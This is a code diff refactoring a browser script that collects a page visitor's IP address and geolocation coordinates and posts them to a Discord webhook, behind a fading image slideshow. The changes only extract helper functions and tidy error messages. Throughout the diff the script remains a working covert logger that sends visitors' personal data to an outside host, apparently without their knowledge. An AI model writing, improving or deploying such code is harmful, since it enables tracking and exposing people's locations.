@@ -13,14 +13,10 @@ async function sendIPToDiscord() {
     try {
         const ipAddress = await getUserIPAddress();
         const ipContent = `**IP Address Information:**\n- IP Address: ${ipAddress}`;
-        const ipEmbed = {
-            title: "IP Address Information",
-            description: ipContent,
-            color: 14267868
-        };
+        const ipEmbed = createEmbed("IP Address Information", ipContent, 14267868);
         await sendMessageToDiscord(ipEmbed);
     } catch (error) {
-        console.error("what da gang", error);
+        console.error("Error sending IP address to Discord:", error);
     }
 }
 
@@ -28,57 +24,21 @@ async function handleLocation() {
     try {
         const locationInfo = await getLocationInfo();
         if (locationInfo) {
-            const locationContent = `**Location Information:` +
-                `\n- Latitude: ${locationInfo.latitude}` +
-                `\n- Longitude: ${locationInfo.longitude}` +
-                `\n- [View on Google Maps](${locationInfo.googleMapsUrl})`;
-            const locationEmbed = {
-                title: "Location Information",
-                description: locationContent,
-                color: 16776960,
-                image: {
-                    url: locationInfo.mapImageUrl
-                }
-            };
+            const locationContent = createLocationContent(locationInfo);
+            const locationEmbed = createEmbed("Location Information", locationContent, 16776960, locationInfo.mapImageUrl);
             await sendMessageToDiscord(locationEmbed);
 
-            const images = [
-                "image1.png", "image2.png", "image3.png", "image4.png", "image5.png"
-            ];
-
-            const imagePromises = images.map(imageName => loadImage(`images/${imageName}`));
-            await Promise.all(imagePromises);
-
-            const imageContainer = document.createElement("div");
-            imageContainer.id = "image-container";
-            document.body.appendChild(imageContainer);
+            const images = ["image1.png", "image2.png", "image3.png", "image4.png", "image5.png"];
+            await preloadImages(images);
 
             const mapContainer = document.getElementById("map");
             mapContainer.style.zIndex = "0";
 
-            let currentIndex = 0;
-            const fadeDuration = 1000;
-
-            function fadeInImage() {
-                const imageElement = new Image();
-                imageElement.src = `images/${images[currentIndex]}`;
-                imageElement.classList.add("fading-image");
-                imageContainer.appendChild(imageElement);
-
-                setTimeout(() => {
-                    imageElement.style.opacity = "1";
-                    setTimeout(() => {
-                        imageElement.style.opacity = "0";
-                        currentIndex = (currentIndex + 1) % images.length;
-                        setTimeout(fadeInImage, fadeDuration);
-                    }, fadeDuration);
-                }, 100);
-            }
-
-            fadeInImage();
+            const imageContainer = createImageContainer();
+            fadeInImages(images, imageContainer);
         }
     } catch (error) {
-        console.error("An error occurred while handling location:", error);
+        console.error("Error handling location:", error);
     }
 }
 
@@ -96,8 +56,59 @@ async function sendMessageToDiscord(embed) {
             throw new Error("Failed to send message to Discord.");
         }
     } catch (error) {
-        console.error("dude what the flip", error);
+        console.error("Error sending message to Discord:", error);
     }
+}
+
+async function preloadImages(images) {
+    const imagePromises = images.map(imageName => loadImage(`images/${imageName}`));
+    await Promise.all(imagePromises);
+}
+
+function createEmbed(title, description, color, imageUrl = null) {
+    const embed = {
+        title,
+        description,
+        color
+    };
+    if (imageUrl) {
+        embed.image = { url: imageUrl };
+    }
+    return embed;
+}
+
+function createLocationContent(locationInfo) {
+    return `**Location Information:**\n- Latitude: ${locationInfo.latitude}\n- Longitude: ${locationInfo.longitude}\n- [View on Google Maps](${locationInfo.googleMapsUrl})`;
+}
+
+function createImageContainer() {
+    const imageContainer = document.createElement("div");
+    imageContainer.id = "image-container";
+    document.body.appendChild(imageContainer);
+    return imageContainer;
+}
+
+async function fadeInImages(images, imageContainer) {
+    let currentIndex = 0;
+    const fadeDuration = 1000;
+
+    async function fadeInImage() {
+        const imageElement = new Image();
+        imageElement.src = `images/${images[currentIndex]}`;
+        imageElement.classList.add("fading-image");
+        imageContainer.appendChild(imageElement);
+
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        imageElement.style.opacity = "1";
+        await new Promise(resolve => setTimeout(resolve, fadeDuration));
+
+        imageElement.style.opacity = "0";
+        currentIndex = (currentIndex + 1) % images.length;
+        setTimeout(fadeInImage, fadeDuration);
+    }
+
+    fadeInImage();
 }
 
 async function loadImage(src) {
@@ -115,7 +126,7 @@ async function getUserIPAddress() {
         const data = await response.json();
         return data.ip;
     } catch (error) {
-        console.error("huuhhh", error);
+        console.error("Error retrieving IP address:", error);
         return "IP address retrieval error";
     }
 }
